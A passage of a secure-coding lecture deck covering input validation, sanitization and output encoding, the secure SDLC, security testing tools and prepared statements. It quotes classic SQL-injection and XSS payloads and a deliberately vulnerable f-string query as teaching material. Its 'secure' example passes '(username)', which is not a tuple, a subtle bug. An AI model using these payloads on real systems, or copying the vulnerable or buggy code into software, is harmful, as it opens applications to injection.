---
deck:
  title: Secure Coding
  kicker: Class 23
  accent: "#B3001B"
  background: "#FFFFFF"
  logo: logo.png
  background_image: bg.png
  class_number: 23
  description: Secure software development principles, input validation, sanitization, secure SDLC, and security testing.
  topics: [Input Validation, Sanitization, Secure SDLC, Security Testing, Prepared Statements]
---

%%%
---
title: Secure Coding
cover: true
---
:::text class=sub
Defensive Programming: Preventing Vulnerabilities through Secure SDLC, Testing, and Input Handling
:::
:::list style=chips
- Allow-list Validation
- Output Encoding
- Secure SDLC Frameworks
- AST Methodologies
:::

:::image src="images/23_secure_coding_cover.png" alt="Clean technical banner illustration on a white background. A large shield icon occupies the center, overlaid with four connected node symbols representing the four lecture pillars: 'Input Validation' (a funnel with a green checkmark filter), 'SDLC' (circular lifecycle arrows), 'AST Tools' (a code scanner with a magnifying glass), and 'Least Privilege' (a layered lock with permission tiers). Code lines in the background fade from red (unsanitized) to green (validated) left-to-right, symbolizing the transformation from vulnerable to secure code. Red and blue accent palette, professional textbook style, labeled, clean technical diagram." caption="Secure coding addresses vulnerability prevention at the source: by building security controls into the development process rather than patching them in after deployment." width=full
:::

%%%
---
unit: Input Handling
code: VAL
title: "Input Validation: Allow-lists vs. Block-lists"
---
:::callout style=soft
**Input Validation** (tracked as **CWE-20**) is the practice of verifying that all data entered into an application conforms to strict specifications before it is processed. Security-conscious developers must choose between **allow-listing (whitelisting)** and **block-listing (blacklisting)**.
:::

::::columns ratio=1:1
::col::
::::card heading="Allow-list Validation (Recommended)"
:::list style=tight
- **Concept**: Explicitly define what is accepted; reject everything else.
- **Implementation**: Enforce restrictions on data type (integer, string), length (min/max), character set (alphanumeric only), and regular expression format (e.g., regex for emails).
- **Security**: Highly robust; prevents novel bypasses and zero-day exploits.
:::
::::
::col::
::::card heading="Block-list Validation (Weak)"
:::list style=tight
- **Concept**: Define what is forbidden; accept everything else.
- **Implementation**: Scan for known bad patterns (e.g., matching `<script>` or `' OR '1'='1`).
- **Security**: Brittle; attackers easily bypass filters using encoding (hex, URL, Unicode) or alternative syntaxes (e.g., `<sCrIpt>`).
:::
::::
::::

:::image src="images/23_allowlist_vs_blocklist_validation.png" alt="Side-by-side decision tree diagram. Left tree labeled 'Allow-list (Whitelist)': input arrives, is it exactly matching the defined acceptable format? Yes: Accept. No: Reject. Examples shown: phone number field only accepts 10 digits, email field must match RFC5322 regex. Right tree labeled 'Block-list (Blacklist)': input arrives, does it match any known bad pattern? Yes: Reject. No: Accept. Below the blocklist tree, a red warning shows bypass examples: URL-encoding of script tags (%3Cscript%3E), double-encoding, and Unicode equivalents. The allow-list tree is highlighted in green; the block-list tree is highlighted in amber." caption="Allow-list validation enforces a strict definition of acceptable input. Block-list validation attempts to enumerate all bad inputs, a battle that cannot be won as encoding bypasses continuously evolve." width=full
:::

:::flow
Receive User Input at the Application Boundary
Determine the Expected Data Type (Integer, String, Date, etc.)
Enforce Data Type Check (Reject if Type Mismatch)
Enforce Length Constraints (Reject if Too Short or Too Long)
Enforce Character Set Allow-list (Reject Disallowed Characters)
Enforce Format Validation via Regex (Reject if Pattern Does Not Match)
Apply Contextual Business Logic Validation (e.g., Date Must Be in the Future)
Accept and Process the Input Only After All Checks Pass
:::

:::notes
Input validation is the first and most fundamental line of defense in application security. Tracked as CWE-20 (Improper Input Validation), this weakness category is consistently among the most prevalent in the CWE Top 25 Most Dangerous Software Weaknesses list. The underlying principle is simple and absolute: no data from an external source should be processed by the application until it has been verified to be what the application expects. This applies to data from users, from APIs, from files, from environment variables, from database records pulled from previous inputs, and from any other external source.

Allow-listing, or whitelisting, is the industry-recommended approach precisely because it is logically sound at a foundational level. By defining exactly what constitutes acceptable input, the developer encodes the complete definition of valid data. Any input that does not precisely match this definition is rejected, regardless of whether the developer anticipated that specific type of malicious input. This means allow-listing provides protection against zero-day injection techniques, encoding bypasses, and attack patterns that have not yet been invented. A zip code field that only accepts exactly five decimal digits will correctly reject a SQL injection string, an XSS payload, a path traversal sequence, and any other malicious input, not because it specifically recognizes those attacks, but because none of them conform to the definition of a five-digit number.

The allow-list is implemented by defining constraints across multiple dimensions simultaneously. Data type validation checks that the raw input conforms to the expected type, integers must be parseable as integers, dates must be parseable as valid calendar dates. Length validation prevents buffer-adjacent attacks and excessive resource consumption by enforcing minimum and maximum character counts. Character set validation restricts which characters are allowed, typically using a regular expression that matches only the expected character classes. For a username field, this might be `^[a-zA-Z0-9_]{3,20}$`, allowing only alphanumeric characters and underscores between three and twenty characters in total length. Any SQL metacharacter, HTML tag, or control character would be rejected by this expression without the developer needing to enumerate every possible malicious pattern.

Block-listing, by contrast, attempts to enumerate every possible dangerous input and reject it. This approach has fundamental theoretical weaknesses that make it unsuitable as a primary security control. Character encoding provides attackers with a near-infinite number of ways to represent the same characters. The string `<script>` can also be represented as `%3Cscript%3E` (URL encoding), `%253Cscript%253E` (double URL encoding), `&#60;script&#62;` (HTML entity encoding), `\x3cscript\x3e` (hex encoding), or in numerous Unicode representations. A block-list that checks for the literal string `<script>` will not catch any of these representations. SQL injection can be constructed without any of the common characters that simple block-lists check for, using techniques like case variation, comment injection, hexadecimal literals, and whitespace substitution. Block-lists require constant maintenance and are always one step behind attacker innovation. According to the OWASP Secure Coding Practices Quick Reference Guide, block-listing should only be used as a secondary defense layer in addition to, never instead of, allow-listing.

A critical implementation note: input validation must be performed on the server side. Client-side validation using HTML5 form attributes (`required`, `pattern`, `maxlength`) or JavaScript is valuable for user experience and reducing unnecessary server load, but it provides zero security. Any attacker can disable JavaScript, intercept and modify the HTTP request using a proxy like Burp Suite, or simply send a raw HTTP request using curl, bypassing the client-side validation layer entirely. Server-side validation is the only validation that can be trusted for security purposes.

NIST SP 800-53 Revision 5 control SI-10 (Information Input Validation) formalizes this requirement, mandating that systems verify the correct syntax and semantics of all information inputs before they are processed. The 2017 Equifax breach, which exposed 147 million consumer records, illustrates the catastrophic consequences of inadequate input validation: attackers exploited CVE-2017-5638 in Apache Struts, a vulnerability rooted in the framework's failure to properly validate and sanitize the Content-Type HTTP header before passing its contents to an expression language interpreter. That single unvalidated input field became the initial foothold for one of the largest data breaches in U.S. history, resulting in approximately $1.4 billion in settlement costs and subsequent congressional scrutiny. The Equifax incident is the definitive real-world demonstration that CWE-20 vulnerabilities carry consequences far beyond theoretical risk, the cost of one unvalidated header field exceeded the entire annual cybersecurity budget of most mid-sized enterprises.
:::

%%%
---
unit: Input Handling
code: SAN
title: Input Sanitization vs. Output Encoding
---
:::callout style=soft
When validation alone is insufficient (e.g., when an application must accept rich text), developers must apply **sanitization** or **output encoding** to ensure data cannot be interpreted as executable code.
:::

:::table
| Control | Definition | Primary Objective | Example |
|---|---|---|---|
| **Input Sanitization** | Modifying user input to remove or neutralize potentially harmful content. | Ensure data is safe to store in the database. | Strip HTML tags from a text comment: `<script>` becomes empty. |
| **Output Encoding** | Converting special characters into their safe, non-executable equivalent before rendering them in the browser. | Prevent client-side interpreter exploitation (XSS). | Convert HTML metacharacters: `<` becomes `&lt;`, `>` becomes `&gt;`. |
:::

:::image src="images/23_sanitization_vs_encoding_flow.png" alt="Two parallel flowcharts sharing the same 'User Input' origin. Left flowchart: 'Input Sanitization Path', input enters a sanitization library (e.g., DOMPurify, OWASP AntiSamy), dangerous elements like script tags and event handlers are stripped, clean data is stored in the database. Right flowchart: 'Output Encoding Path', raw data is retrieved from the database, a context-aware encoder converts HTML metacharacters (< becomes &lt;, > becomes &gt;, quotes become &#39;), encoded safe string is rendered in the browser as text. Both paths converge at 'Safe User Experience' at the bottom." caption="Sanitization modifies data at ingestion to make it safe for storage. Output encoding transforms data at render time to make it safe for display in a specific context (HTML, JavaScript, URL, CSS)." width=full
:::

:::flow
User Submits Input Potentially Containing HTML or Script Content (e.g., Rich Text Comment)
Input Sanitization Library Invoked (DOMPurify, OWASP AntiSamy, or Equivalent Allow-list Parser)
Disallowed Elements Stripped: Script Tags, Event Handler Attributes, javascript: URL Schemes
Sanitized Safe Content Stored in Database
Page Render Request Received by Application Server
Clean Data Retrieved from Database by Templating Layer
Context-Aware Output Encoder Applied Based on Rendering Context (HTML Body, HTML Attribute, JavaScript, CSS, or URL)
Special Characters Converted to Safe Equivalents (< to &lt;, > to &gt;, ' to &#39;, " to &quot;)
Encoded String Inserted into HTML Template and Served to Browser
Browser Renders Encoded Content as Literal Display Text, No Script Execution Possible
:::

:::notes
While input validation addresses the question "should we accept this input at all?", sanitization and output encoding address a different scenario: "we must accept this input, so how do we ensure it cannot cause harm?" These two controls are often confused or conflated by developers, but they have distinct objectives, operate at different points in the data lifecycle, and must be applied correctly in their respective contexts to be effective.

Input sanitization is the process of transforming input data to remove or neutralize elements that could be interpreted as executable instructions by downstream systems. The most common application is rich-text content. A blog platform, a forum, or an email composition tool may legitimately need to accept HTML formatting from users, bold text, hyperlinks, ordered lists. In these cases, rejecting all HTML would break the product's core functionality. Instead, a sanitization library like OWASP AntiSamy (for Java) or DOMPurify (for JavaScript) processes the HTML input through a strict allowlist-based parser, removing all elements and attributes that are not explicitly approved for user content, eliminating `<script>` tags, `javascript:` URLs, `onclick` attributes, and any other vectors for script execution, while preserving safe formatting elements like `<strong>`, `<em>`, and `<a href="https://...">`. The sanitized content is then stored in the database. Critically, sanitization must be performed correctly before storage, not before display; data that enters the database unsanitized may be displayed on pages that do not apply sanitization, creating stored XSS vulnerabilities.

Output encoding, also called output escaping, solves a different problem. Its purpose is not to modify the stored data but to transform it at the moment it is rendered into a specific output context, preventing the rendering engine, the web browser's HTML parser, JavaScript engine, or CSS processor, from misinterpreting data characters as instructions. The key insight of output encoding is that the same character has different significance in different contexts. The less-than symbol `<` is a dangerous character in HTML context (it opens a tag) but is harmless in a JSON string (no HTML significance). Conversely, a backslash is dangerous in a JavaScript string but harmless in an HTML attribute value. This is why output encoding must be context-aware.

The OWASP XSS Prevention Cheat Sheet defines five distinct output encoding contexts, each requiring different encoding rules: HTML body (encode `<`, `>`, `&`, `"`, `'`), HTML attribute values (HTML entity-encode all non-alphanumeric characters), JavaScript values (JavaScript-escape all non-alphanumeric characters using `\xHH` notation), CSS values (CSS hex-escape all non-alphanumeric characters), and URL parameters (percent-encode using the URL encoding standard). Applying the wrong encoding for a context is a common source of XSS vulnerabilities even in applications that do apply encoding. For instance, encoding HTML entities and then placing the result inside a JavaScript string literal does not prevent JavaScript injection, because JavaScript will execute the JavaScript characters before the HTML entities are parsed.

A practical example: a user submits the comment `<script>alert('XSS')</script>`. Proper sanitization would strip the `<script>` tag before database storage. Proper output encoding (if the sanitization step was missed or if the application must display unsanitized legacy data) would convert `<` to `&lt;` and `>` to `&gt;` when rendering, causing the browser to display the literal text of the script tag rather than executing it. Defense-in-depth security recommends applying both, sanitize at input and encode at output, so that two independent controls must both fail before an XSS attack succeeds.

NIST SP 800-53 Revision 5 control SI-15 (Information Output Filtering) formalizes the output encoding requirement at the policy level, mandating that systems validate and filter information outputs before display or transmission to prevent unintended information disclosure. Cross-site scripting vulnerabilities are catalogued as CWE-79 (Improper Neutralization of Input During Web Page Generation) and consistently rank among the top three weaknesses in the OWASP Top 10, appearing as part of A03:2021 – Injection. A well-documented production failure is CVE-2019-5418, a path traversal and remote code execution vulnerability in Ruby on Rails' Action View component caused by insufficient encoding of the HTTP Accept header before it was used to resolve a template file path, demonstrating that output encoding failures extend beyond XSS into arbitrary file access and code execution. The 2018 British Airways breach, which exposed 500,000 customer payment records, was attributed in part to injected skimming scripts that a robust Content Security Policy (an output-layer control) and strict output encoding could have contained.
:::

%%%
---
unit: SDLC
code: SDL
title: The Secure Development Lifecycle (SDLC)
---
:::callout style=soft
A **Secure Software Development Lifecycle (SSDLC)** integrates security activities into every phase of the development process, aligning with frameworks like **Microsoft SDL**, **OWASP SAMM**, and **BSIMM**.
:::

:::steps
1. **Requirements**: Define compliance regulations (GDPR, PCI-DSS) and compile security requirements.
2. **Design**: Perform threat modeling (using STRIDE) and review architectural security controls.
3. **Implementation**: Write secure code using standards (OWASP Top 10 mitigations, prepared statements).
4. **Testing**: Run static and dynamic analyses (SAST, DAST) and conduct penetration testing.
5. **Deployment**: Harden server environments, manage secrets, and configure secure defaults.
6. **Maintenance**: Establish incident response plans, monitor for anomalies, and patch dependencies.
:::

:::image src="images/23_ssdlc_phases_diagram.png" alt="Circular lifecycle diagram with six phases arranged around a central 'Security' hub. Each phase is a colored segment: Requirements (blue), Design (purple), Implementation (green), Testing (orange), Deployment (red), Maintenance (grey). Each segment lists the primary security activity for that phase (e.g., Threat Modeling in Design, SAST/DAST in Testing). Bidirectional arrows between phases indicate that security findings in later phases feed back to earlier phases. The overall shape suggests a continuous cycle rather than a linear waterfall." caption="The Secure Software Development Lifecycle (SSDLC): security is integrated as a continuous activity at every phase, not added as a post-development check." width=full
:::

:::notes
The traditional waterfall software development lifecycle treated security as a final quality gate, a penetration test or code review performed just before the release date. This approach consistently produced costly, delayed releases because architectural security flaws discovered at the end of development require the same extensive redesign they would have required at the beginning, but now with the added pressure of impending deployment deadlines. A security vulnerability found during the requirements phase costs virtually nothing to address: a line item is added to the specification document. The same vulnerability found in production after deployment may cost millions of dollars in remediation, breach notification, regulatory fines, and reputational damage. Studies by IBM and the Systems Sciences Institute consistently place the ratio of remediation cost from design phase to production at approximately 1:100.

The Secure Software Development Lifecycle integrates security activities into every phase of development, dramatically shifting this cost curve by identifying vulnerabilities when they are cheapest to address. This "shift-left" philosophy, moving security testing and evaluation earlier in the lifecycle, is now mandated by NIST SP 800-218 (SSDF) and required by Executive Order 14028 for software used by the U.S. federal government.

The Requirements phase establishes the security foundation. Security engineers collaborate with business analysts and compliance officers to identify all regulatory and contractual obligations that apply to the software: GDPR data privacy requirements, HIPAA patient data protections, PCI-DSS cardholder data security mandates, SOC 2 trust service criteria, and any sector-specific regulations. These requirements are translated into specific, verifiable security user stories and acceptance criteria: "As a system, I must hash all user passwords using Argon2id before storage" is a concrete, testable security requirement.

The Design phase is where threat modeling occurs. Security architects review the proposed system architecture and data flow diagrams, applying frameworks like STRIDE or PASTA (Process for Attack Simulation and Threat Analysis) to identify potential vulnerabilities in the design before any code is written. Security design review sessions produce an updated architecture with explicit security controls addressing each identified threat, and a list of security requirements that the implementation team must meet.

During Implementation, developers follow secure coding guidelines drawn from the OWASP Top 10 mitigations, the SANS CWE Top 25, and language-specific secure coding guides (such as SEI CERT C Coding Standard for C/C++ or the Google Java Style Guide security annotations). Static analysis tools (SAST) are integrated into the IDE and the CI/CD pipeline, providing real-time feedback to developers as they write code rather than days later in a batch report.

The Testing phase applies both static and dynamic testing methodologies, supplemented by manual security code review for high-risk components and penetration testing against staging environments that mirror production. The Deployment phase applies configuration management and infrastructure-as-code security checks, ensuring that deployment scripts do not introduce misconfigurations. The Maintenance phase, often the longest-lived phase, establishes the ongoing processes of vulnerability monitoring, dependency patching, incident response, and post-incident review that keep the application secure throughout its operational life.

Organizations measure the maturity of their SSDLC implementation using models like OWASP SAMM (Software Assurance Maturity Model) and BSIMM (Building Security In Maturity Model). SAMM defines five business functions (Governance, Design, Implementation, Verification, Operations) each with three security practices and three maturity levels, allowing organizations to benchmark their current state and plan measurable improvements toward higher maturity.

The consequences of an immature SSDLC Maintenance phase are illustrated with exceptional clarity by CVE-2021-44228 (Log4Shell), a critical remote code execution vulnerability in the Apache Log4j library embedded as a transitive dependency in thousands of enterprise Java applications worldwide. Organizations without a mature dependency management and SCA practice had no inventory of which applications contained Log4j and at which version; many discovered their exposure only after active exploitation began in December 2021. Those with a mature SSDLC Maintenance phase, including continuous SCA scanning, a documented software bill of materials (SBOM), and a practiced incident response runbook, identified and patched affected instances within hours of CVE publication. NIST SP 800-218 (Secure Software Development Framework) formalizes the SSDLC into four high-level practice groups: Prepare the Organization (PO), Protect the Software (PS), Produce Well-Secured Software (PW), and Respond to Vulnerabilities (RV). U.S. Executive Order 14028 mandates that all software vendors supplying the federal government attest to following NIST SSDF practices, making SSDLC maturity a contractual obligation alongside its security merits.
:::

%%%
---
unit: Testing
code: AST
title: Application Security Testing (AST) Methodologies
---
::::columns ratio=1:1
::col::
:::callout style=soft
Security teams utilize multiple testing methodologies to identify vulnerabilities within the application code, dependencies, and runtime behavior.
:::
:::table
| Methodology | Analysis Scope | Target Phase |
|---|---|---|
| **SAST** | Source Code / Binaries | Implementation / Build |
| **DAST** | Running Application | Testing / Staging |
| **IAST** | Runtime Instrumentation| Testing / QA |
| **SCA** | Open Source Components | Throughout SDLC |
:::
::col::
::::card heading="Detailed Testing Types"
:::list style=tight
- **SAST (Static Application Security Testing)**: Scans source code for known vulnerable patterns without executing the program. High coverage, but prone to false positives.
- **DAST (Dynamic Application Security Testing)**: Attacks a running application from the outside, mimicking a hacker. Detects runtime and configuration flaws, but lacks line-of-code visibility.
- **IAST (Interactive)**: Combines SAST and DAST by placing an agent inside the application runtime.
- **SCA (Software Composition Analysis)**: Analyzes third-party dependencies for known CVEs.
:::
::::
::::

:::image src="images/23_ast_methodologies_comparison.png" alt="Quadrant diagram with four quadrants labeled SAST (top left), DAST (top right), IAST (center), and SCA (bottom). Each quadrant shows: the testing perspective (inside-out for SAST, outside-in for DAST), when in the SDLC the tool runs (build pipeline for SAST, staging for DAST, everywhere for SCA), what it can find (code flaws for SAST, runtime issues for DAST, CVEs for SCA), and its key limitation (false positives for SAST, no source visibility for DAST). Color coding: SAST in blue, DAST in red, IAST in purple, SCA in green." caption="The four Application Security Testing methodologies complement each other: no single tool provides complete coverage, and a mature security testing program uses all four in combination." width=full
:::

:::steps
1. **Developer Commit**: Code is pushed to version control; lightweight pre-commit SAST hooks (e.g., Semgrep rules) run in the developer's IDE before the push reaches the repository.
2. **CI Pipeline Trigger**: The CI system (Jenkins, GitHub Actions, GitLab CI) initiates a full module-level SAST scan; critical-severity findings fail the build and notify the developer immediately.
3. **Dependency Audit (SCA)**: The SCA tool scans the dependency manifest (package.json, requirements.txt, pom.xml) against the NVD and GitHub Advisory Database; critical CVEs block the merge request.
4. **Artifact Build and Deploy to Staging**: The tested build artifact is deployed to a staging environment configured to mirror production, including authentication systems, external integrations, and secrets management.
5. **Automated DAST Scan Against Staging**: An automated DAST tool (OWASP ZAP, Burp Suite Enterprise) runs a scripted attack sequence covering all OWASP Top 10 categories against all discovered application endpoints.
6. **IAST Monitoring During Functional QA Testing**: The IAST agent instruments the staging application during QA functional test runs, confirming taint flow from user input to dangerous execution sinks with zero false positives.
7. **Manual Penetration Test at Release Gate**: For significant releases, a security engineer performs manual penetration testing and threat-model-guided review of high-risk components and business logic not covered by automated tools.
8. **Production Deployment and Ongoing Monitoring**: Approved builds are deployed; SCA dependency scanning and runtime anomaly monitoring continue throughout the operational lifecycle.
:::

:::notes
To verify that secure coding practices have been correctly applied and that no vulnerabilities have been introduced during development, security teams deploy a suite of specialized testing tools and methodologies collectively categorized as Application Security Testing. No single methodology is sufficient on its own; the strengths of each tool fill the gaps left by the others, and a mature security testing program deploys them in combination throughout the development lifecycle.

Static Application Security Testing (SAST), sometimes called "white-box testing," operates on source code, byte code, or compiled binaries without executing the application. SAST tools parse the application's code into an abstract syntax tree (AST) or a control flow graph and then traverse this representation, looking for patterns that match known vulnerability signatures. For example, a SAST rule might flag any string concatenation operation where one operand is the result of reading a HTTP request parameter and the concatenated result is passed to a database query API, a pattern that typically indicates a SQL injection risk. SAST provides comprehensive code coverage because it can analyze every line of code, including error-handling paths, admin functions, and legacy code that may not be reachable by live testing. Commercial SAST tools include Checkmarx, Fortify, and Veracode. Open-source options include Semgrep, Bandit (Python), and FindBugs (Java). The primary limitation of SAST is a high false-positive rate, the tool may flag code that appears structurally similar to a vulnerability but is protected by context-specific validation elsewhere in the codebase. Security engineers must triage and verify SAST findings before treating them as confirmed vulnerabilities.

Dynamic Application Security Testing (DAST), sometimes called "black-box testing," operates against a running application without access to source code, mimicking the perspective of an external attacker. DAST tools send sequences of crafted HTTP requests to the application's endpoints, analyzing the responses for indicators of vulnerabilities, unexpected error messages that reveal database structure, response body reflections of injected script tags, authentication bypass conditions, or abnormal response times that suggest blind SQL injection. The industry-standard open-source DAST tool is OWASP ZAP (Zed Attack Proxy); commercial tools include Burp Suite Pro and Acunetix. DAST excels at finding configuration errors, authentication flaws, and injection vulnerabilities that manifest at runtime. Its primary limitation is visibility: when DAST finds a vulnerability, it knows the vulnerable endpoint but not which line of code is responsible. A human reviewer must then trace the finding back through the source code.

Interactive Application Security Testing (IAST) bridges the gap between SAST and DAST by instrumenting the application with a security agent that runs inside the application server during normal execution or automated testing. The agent monitors the application from within, observing all code paths that are actually executed, all data flows between functions, and all interactions with external systems (databases, file system, network). When the testing framework or a live user exercises a feature, the IAST agent can definitively confirm whether user-supplied data reaches a dangerous operation without proper sanitization, eliminating the false-positive problem of SAST and the source-invisibility problem of DAST.

Software Composition Analysis (SCA) addresses the third root cause of vulnerabilities: supply chain risk. SCA tools analyze the application's dependency manifest files (such as `package.json`, `requirements.txt`, `pom.xml`, or `Gemfile.lock`) and cross-reference every listed dependency against vulnerability databases including the NIST National Vulnerability Database (NVD), GitHub Advisory Database, and OSV. When a dependency with a known CVE is detected, the SCA tool reports the affected version, the CVE severity score, and available patched versions. SCA should run on every commit and every dependency update, as new CVEs for existing dependencies are published continuously. The 2021 Executive Order on Cybersecurity requires federal software suppliers to provide SBOMs, making SCA a compliance-critical capability for government contractors.

The critical importance of SCA was demonstrated by CVE-2021-44228 (Log4Shell), where the Apache Log4j library, embedded as a transitive dependency in thousands of enterprise Java applications, was found to allow unauthenticated remote code execution through a crafted JNDI lookup string embedded in any logged user input. Organizations without SCA tooling had no inventory of which of their applications contained Log4j and at which version; many discovered their exposure only after active exploitation began. NIST SP 800-53 Revision 5 control SA-11 (Developer Testing and Evaluation) mandates that organizations require software developers to employ security assessment techniques including threat modeling, static analysis, dynamic testing, and penetration testing, encompassing the complete SAST/DAST/IAST/SCA taxonomy described here. ISO/IEC 27001:2022 Annex A control 8.29 (Security testing in development and acceptance) further requires that security testing be planned, implemented, and documented prior to any production deployment, aligning with the CI/CD-integrated AST pipeline structure described in this lecture.
:::

%%%
---
unit: Prepared Statements
code: PST
title: Preventing SQLi with Prepared Statements
---
:::callout style=soft
**Prepared Statements (Parameterized Queries)** structurally prevent SQL Injection by separating the SQL query structure from the user-supplied data, ensuring the SQL compiler never treats input as executable code.
:::

::::columns ratio=1:1
::col::
:::code language=python caption="Vulnerable Python Code, f-string concatenation allows SQL injection"
# UNSAFE: f-string interpolation directly embeds username into SQL
# If username = "admin' OR '1'='1", the WHERE clause becomes always-true
def get_user_bad(username):
    # The f-string builds a single SQL string mixing structure and data.
    # The database parser cannot tell which parts are developer SQL
    # and which parts are attacker-supplied content.
    query = f"SELECT * FROM users WHERE user = '{username}'"
    
    # cursor.execute() receives a single pre-built string.
    # The database parses and executes it as-is, including any injected SQL.
    cursor.execute(query) # EXPLOITABLE, attacker controls the query structure
:::
::col::
:::code language=python caption="Secure Python Code, parameterized query separates structure from data"
# SAFE: The query template and the data are sent to the database separately.
# The database compiles the query structure BEFORE receiving any user input.
def get_user_good(username):
    # The ? placeholder marks where the parameter will be substituted.
    # The database compiles this template into a fixed execution plan.
    # No user input has been seen yet at this stage.
    query = "SELECT * FROM users WHERE user = ?"
    
    # cursor.execute() receives the compiled template AND the parameter separately.
    # The database driver binds username as a typed literal value.
    # Even if username = "admin'--", it is treated as the string "admin'--", not SQL.
    cursor.execute(query, (username)) # SECURE, user data is never parsed as SQL
:::
::::

:::image src="images/23_prepared_statement_execution_flow.png" alt="Two-track timing diagram showing database query execution. Top track (Vulnerable): (1) Application builds SQL string with user input concatenated. (2) Single string sent to database engine. (3) Parser tokenizes entire string as SQL, user input parsed as SQL syntax. (4) Malicious SQL executed. Bottom track (Parameterized): (1) Application sends SQL template with placeholder to database engine. (2) Database compiles template into execution plan, no user data present yet. (3) Application sends user data separately as parameter. (4) Database binds data as a literal value into the compiled plan. (5) Query executed safely. Red arrows show injection point in top track; green shield shows neutralization in bottom track." caption="Prepared statement execution model: the database compiles the query structure in isolation before user data is ever supplied, making it structurally impossible for user input to influence the query's command structure." width=full
:::

:::flow
Developer Writes SQL Query Template Containing Only Structural SQL and Parameter Placeholders (? or :param)
Application Sends Template to Database Engine, First Interaction, No User Data Included Yet
Database Engine Parses and Validates SQL Syntax of the Template Alone
Database Compiles Template into a Fixed, Immutable Query Execution Plan
Execution Plan Cached, Query Structure Is Now Permanently Locked
User Provides Input Data via Application Interface (Form Field, API Request, etc.)
Application Sends User Data to Database as a Separate, Typed Parameter Binding, Second Interaction
Database Execution Engine Substitutes Parameter Values into Pre-Compiled Plan as Literal Data Values
No Re-Parsing Occurs, SQL Characters in Parameter Values Are Treated as String Data, Not SQL Syntax
Query Executes Safely Against Bound Literal Values, Injection of Any Character Combination Cannot Alter the Fixed Command Structure
:::

:::notes
Prepared statements, also called parameterized queries, are the definitive, structurally complete defense against SQL injection, classified as CWE-89. Unlike input filtering, which attempts to detect and remove malicious SQL characters, parameterization eliminates the category of vulnerability at an architectural level, regardless of what the input contains. Understanding why parameterized queries work requires understanding how a database processes a query at a low level.

When a database receives a traditional SQL string, it passes the string through a lexical analyzer that tokenizes it into its component parts: keywords (`SELECT`, `WHERE`, `AND`), identifiers (table names, column names), operators (`=`, `>`, `AND`), and string literals. This tokenization process cannot consider the developer's intent. To the tokenizer, there is no meaningful distinction between the character `'` that the developer wrote to enclose the expected value and the character `'` that the attacker injected to break out of the string literal. Both single quotes are semantically identical to the parser, they both close string literals.

Prepared statements interrupt this process by splitting it into two completely separate interactions. In the first interaction, the application sends the query template to the database. This template contains placeholders, usually `?` in JDBC and most Python database drivers, or named parameters like `:username` in SQLAlchemy and Oracle, that mark where user data will be inserted later. Critically, this template contains no user input whatsoever. The database engine parses, validates, and compiles this template into a stored query execution plan. The SQL syntax structure is now locked and immutable.

In the second interaction, the application sends the user data separately as a list of parameter values, bound to the positions indicated by the placeholders. The database's execution engine takes these values and substitutes them into the pre-compiled execution plan as typed, literal data values. There is no re-parsing step. A string parameter is inserted as a string data value. If the value contains SQL characters, single quotes, double dashes, semicolons, UNION keywords, these characters are stored as characters within the string value, never interpreted as SQL syntax. The query's command structure was finalized before the data arrived and cannot be retroactively altered by it.

This guarantee extends to every parameterized value, every data type, and every SQL dialect. The Python DB-API 2.0 specification (PEP 249), the Java JDBC `PreparedStatement` interface, the .NET `SqlCommand` with parameterized queries, and every modern ORM (SQLAlchemy, Hibernate, Django ORM, Entity Framework) implement this same two-phase separation. The security recommendation from OWASP, NIST, and every major database vendor is identical and unambiguous: use parameterized queries for every database interaction that incorporates user-supplied data. When using an ORM framework, prefer its query-builder methods over raw string query methods, as the ORM will automatically parameterize variables; only resort to raw SQL when absolutely necessary, and parameterize it explicitly even then.

The financial and historical consequences of SQL injection through string concatenation are extraordinarily well-documented. The 2008 Heartland Payment Systems breach, perpetrated by attacker Albert Gonzalez and co-conspirators, leveraged SQL injection to compromise over 130 million credit card records, at the time, the single largest known data theft. The attack exploited precisely the string-concatenation vulnerability pattern shown in the vulnerable code example above. Heartland ultimately paid over $130 million in fines, settlements, and remediation costs, and its CEO stated in post-breach testimony that a parameterized query requirement enforced across the development team could have prevented the breach entirely. SQL injection vulnerabilities classified as CWE-89 consistently rank in the OWASP Top 10 (currently included under A03:2021 – Injection) and the CWE Top 25. NIST SP 800-53 Revision 5 control SI-10 and the OWASP SQL Injection Prevention Cheat Sheet both list parameterized queries as the primary defense, with stored procedures combined with privilege restriction as an acceptable alternative when parameterization is architecturally unavoidable.
:::

%%%
---
unit: Least Privilege
code: LSP
title: Least Privilege in Application Architecture
---
:::callout style=soft
Applying the **Principle of Least Privilege** (as defined by Saltzer and Schroeder) at the application layer minimizes the impact of an application compromise.
:::

::::columns ratio=1:1
::col::
::::card heading="Database Layer Least Privilege"
:::list style=tight
- **Dedicated Accounts**: The application must connect to the database using a low-privileged service account, never the `root` or `sa` account.
- **Granular Permissions**: Restrict permissions to the minimum necessary: grant `SELECT`, `INSERT`, and `UPDATE` only on specific tables; deny `DROP` or `ALTER` entirely.
- **Stored Procedures**: Restrict direct table access and only permit execution of specific stored procedures.
:::
::::
::col::
::::card heading="Runtime and OS Least Privilege"
:::list style=tight
- **Non-Root Execution**: Run the application process under a dedicated, low-privileged OS user account.
- **Container Hardening**: Run containerized applications (e.g., Docker) without root capabilities, enforcing a read-only filesystem.
- **API Scope Control**: Limit third-party API keys to restricted scopes (e.g., read-only access to a specific folder).
:::
::::
::::

:::image src="images/23_least_privilege_application_layers.png" alt="Layered architecture diagram showing defense in depth through least privilege. Top layer: User Access, roles restricted to minimum necessary permissions (Read-Only User, Editor, Admin). Middle layer: Application Service Account, only SELECT/INSERT on specific tables, no DROP/ALTER. Lower-middle layer: Operating System Process, runs as non-root low-privilege user, no filesystem write access outside designated directories. Bottom layer: Container/VM, read-only root filesystem, no privileged capabilities, network egress restricted by policy. At each layer, a 'blast radius' annotation shows that an attacker compromising that layer is contained within that layer's permission boundary." caption="Least privilege applied at every layer: even if the web application is compromised, the attacker's access is bounded by the service account's constrained permissions, limiting lateral movement and damage." width=full
:::

:::steps
1. **Inventory All Identities**: Enumerate every service account, API key, OS process user, and container identity the application uses across all environments (development, staging, production).
2. **Define Minimum Required Permissions**: For each identity, document only the specific operations necessary for its function (e.g., SELECT on the orders table; read-only access to a specific S3 bucket prefix).
3. **Provision Dedicated Service Accounts**: Create separate, non-shared service accounts for each application component; never reuse credentials between services or environments.
4. **Apply Granular Database Grants**: Issue only table-level and column-level GRANT statements for the exact permissions needed; explicitly deny broad roles (db_owner, SYSADMIN, DBA) and DDL permissions (DROP, ALTER, TRUNCATE).
5. **Harden the OS Process Context**: Configure the application to run as a named non-root OS user with no interactive shell, no home directory, and no filesystem write access outside the application's designated directories.
